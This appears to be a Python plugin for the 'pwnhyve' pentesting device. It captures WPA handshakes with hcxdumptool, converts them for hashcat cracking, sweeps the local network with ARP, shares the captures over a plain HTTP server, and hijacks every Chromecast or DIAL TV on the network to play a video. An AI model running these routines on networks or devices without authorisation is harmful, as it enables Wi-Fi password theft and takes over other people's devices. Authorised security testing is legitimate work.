from core.plugin import BasePwnhyvePlugin
from core.utils import *
from threading import Thread
from subprocess import getoutput
import netifaces as ni
from scapy.all import ARP, Ether, srp
from pylaunch.dial import Dial
import time
import pychromecast
import zeroconf
from pychromecast.controllers.youtube import YouTubeController
# Created by Mater #
class PWNmaters(BasePwnhyvePlugin):
    def matertest(tpil):
        terminal = tpil.gui.screenConsole()
        terminal.addText("This is a test plugin, if you see this, it works!!!!\nPress any key to exit...")
        tpil.waitForKey()
        return
    # This function is pretty good, needs more customization for ease of use #
    def hcxdumptool(tpil):
        """Capture handshakes using hcxdumptool"""
        terminal = tpil.gui.screenConsole()
        terminal.addText("This plugin will run hcxdumptool to capture handshakes\nPress any key to continue...\n")
        tpil.waitForKey()
        tpil.clear()
        terminal.text = ""
        interface = "wlan1"
        if interface == None:
            terminal.addText("No wireless interface found, exiting...\n")
            tpil.waitForKey()
            return
        terminal.addText(f"Using wireless interface: {interface}\n")

        # go into monitor mode #
        getoutput(f"sudo airmon-ng start {interface}")
        cmd = f"sudo hcxdumptool -i {interface}mon  -w /root/pwnhyve/handshakes/output.pcapng"
        terminal.addText("Press any key to stop\n")
        process = Thread(target=getoutput, args=(cmd,))
        process.start()
        tpil.waitForKey()
        tpil.clear()
        getoutput("pkill hcxdumptool")
        process.join()
        
        terminal.addText("Capture stopped. Handshakes saved to this folder\nPress any key to exit...")
        tpil.waitForKey()
        
        return
    
    # Something that is working properly #
    def Convert_Handshakes(tpil):
        """Convert all handshakes in the handshake folder to a hashcat readable format"""
        terminal = tpil.gui.screenConsole()
        terminal.addText("Converting all files in handshake folder")
        
        cmd = "hcxpcapngtool /root/pwnhyve/handshakes/* -o handshakes"
        process = Thread(target=getoutput, args=(cmd,))
        process.start()
        terminal.addText("Wait a bit then press any key")
        tpil.waitForKey()
    # TODO add more options to this function #
    # TODO add more info on the devices found, ports, services, etc... #
    def Discover(tpil):
        """Discover devices on the network using arp packets"""
        terminal = tpil.gui.screenConsole()
        terminal.addText("This plugin will use arp packets to discover devices on the network\nPress any key to continue...\n")
        tpil.waitForKey()
        
        terminal.text = ""
        
        ip_address = ni.ifaddresses("wlan0")[ni.AF_INET][0]['addr']
        base_ip = '.'.join(ip_address.split('.')[:-1])
        tpil.clear()
        terminal.addText(f"Your IP address: {ip_address}\n")
        terminal.addText(f"Base IP: {base_ip}.0/24")
        
        tpil.waitForKey()
        
        terminal.text = ""
        

        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{base_ip}.0/24"), timeout=2)
        terminal.addText("Discovered devices:\n")
        for snd, rcv in ans:
            terminal.addText(f"IP: {rcv.psrc} - MAC: {rcv.hwsrc}\n")
            tpil.waitForKey()
            terminal.text = ""
        return
    # I am unable to kill the server properly, if you can find a fix let me know #
    def ShareHandShakes(tpil):
        """Share handshakes using a simple http server"""
        terminal = tpil.gui.screenConsole()
        terminal.addText("Starting a http server on port 12969 to share handshakes\n")
        
        cmd = "python3 -m http.server -d /root/pwnhyve/handshakes/ 12969"
        process = Thread(target=getoutput,args=(cmd,))
        process.start()
        terminal.text = ""
        terminal.addText("finished starting server restart to stop\nPress any key to exit...")
        tpil.waitForKey()

        getoutput("pkill http.server")
        
        return
    # I dont know if the dial protcol is working properly, open an issue if you can test this #
    def Cast(tpil):
        """Cast to all tvs on your network"""
        terminal =tpil.gui.screenConsole()
        terminal.addText("This module can cast to all tvs on your network\nUSE WITH CAUTION!")
        tpil.waitForKey()
        d = Dial.discover()
        
        print(d)

        for device in d:
            try:
                device.launch_app('YouTube', v='dQw4w9WgXcQ')
            except Exception as error:
                print(error)
    
        zconf = zeroconf.Zeroconf()
        listener = pychromecast.SimpleCastListener()
        browser = pychromecast.CastBrowser(listener, zconf)
        browser.start_discovery()
        time.sleep(2)
        pychromecast.discovery.stop_discovery(browser)

        for uuid, info in browser.devices.items():
            print(f"UUID: {uuid}, Friendly Name: {info.friendly_name}")
            chromecasts, browser2 = pychromecast.get_listed_chromecasts(uuids={uuid})
            if chromecasts:
                cast = chromecasts[0]
                cast.wait()
                yt = YouTubeController()
                cast.register_handler(yt)
                yt.play_video("dQw4w9WgXcQ")
                browser2.stop_discovery()

        terminal.text = ""
        terminal.addText("Done targeting dial and chromecast devices :)")
        tpil.waitForKey()
        return

   
